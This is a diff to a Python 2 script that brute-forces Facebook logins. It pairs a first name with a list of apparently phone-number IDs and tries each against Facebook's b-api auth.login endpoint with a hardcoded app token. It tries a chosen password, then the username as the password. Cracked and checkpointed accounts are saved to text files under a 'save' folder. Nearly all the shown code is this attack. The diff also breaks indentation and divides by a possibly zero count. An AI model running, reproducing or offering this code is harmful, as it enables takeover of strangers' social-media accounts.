@@ -125,57 +125,57 @@ except IOError:
 
 
 			
-	xxx = str(len(id))
-	print ('\033[1;96m[✓] \033[1;93mTotal Nama: \033[97m'+xxx)
-	time.sleep(0.1)
-	pass1 = raw_input("\033[1;96m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 42*"\033[1;96m="
-	print "\033[96m| 😎 | " + 3*" " + "\033[35mNOMOR HP" + 4*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
-	print 42*"\033[1;96m="
+xxx = str(len(id))
+print ('\033[1;96m[✓] \033[1;93mTotal Nama: \033[97m'+xxx)
+time.sleep(0.1)
+pass1 = raw_input("\033[1;96m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
+print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+print 42*"\033[1;96m="
+print "\033[96m| 😎 | " + 3*" " + "\033[35mNOMOR HP" + 4*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
+print 42*"\033[1;96m="
 	
 			
-	def main(arg):
-		global cpb,oks
-		user = arg
-		try:
-			os.mkdir('save')
-		except OSError:
-			pass
-		try:
-			pass1
-			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +firstname+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass1
-				okb = open('save/successfull.txt', 'a')
-				okb.write(firstname+user+'|'+pass1+'\n')
-				okb.close()
-				oks.append(firstname+user+pass1)
+def main(arg):
+	global cpb,oks
+	user = arg
+	try:
+		os.mkdir('save')
+	except OSError:
+		pass
+	try:
+		pass1
+		data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +firstname+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+		q = json.load(data)
+		if 'access_token' in q:
+			print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass1
+			okb = open('save/successfull.txt', 'a')
+			okb.write(firstname+user+'|'+pass1+'\n')
+			okb.close()
+			oks.append(firstname+user+pass1)
+		else:
+			if 'www.facebook.com' in q['error_msg']:
+				print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass1
+				cps = open('save/checkpoint.txt', 'a')
+				cps.write(firstname+user+'|'+pass1+'\n')
+				cps.close()
+				cpb.append(firstname+user+pass1)
 			else:
-				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass1
-					cps = open('save/checkpoint.txt', 'a')
-					cps.write(firstname+user+'|'+pass1+'\n')
-					cps.close()
-					cpb.append(firstname+user+pass1)
+				pass2 = user
+				data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +firstname+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+				q = json.load(data)
+				if 'access_token' in q:
+					print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass2
+					okb = open('save/successfull.txt', 'a')
+					okb.write(firstname+user+'|'+pass2+'\n')
+					okb.close()
+					oks.append(firstname+user+pass2)
 				else:
-					pass2 = user
-					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +firstname+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-					q = json.load(data)
-					if 'access_token' in q:
-						print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass2
-						okb = open('save/successfull.txt', 'a')
-						okb.write(firstname+user+'|'+pass2+'\n')
-						okb.close()
-						oks.append(firstname+user+pass2)
-					else:
-						if 'www.facebook.com' in q['error_msg']:
-							print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass2
-							cps = open('save/checkpoint.txt', 'a')
-							cps.write(firstname+user+'|'+pass2+'\n')
-							cps.close()
-							cpb.append(firstname+user+pass2)
+					if 'www.facebook.com' in q['error_msg']:
+						print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + firstname + user +   ' | '  +  pass2
+						cps = open('save/checkpoint.txt', 'a')
+						cps.write(firstname+user+'|'+pass2+'\n')
+						cps.close()
+						cpb.append(firstname+user+pass2)
 
 
 		
@@ -193,7 +193,7 @@ def welcome():
 """
 	print wel 
 	print " [*] Account to crack : {}".format(firstname)
-	print " [*] Loaded :" , len(listpass)
+	print " [*] OK/CP :" , len(oks)/len(cpb)
 	print " [*] Cracking, please wait ...\n\n"
 
 	
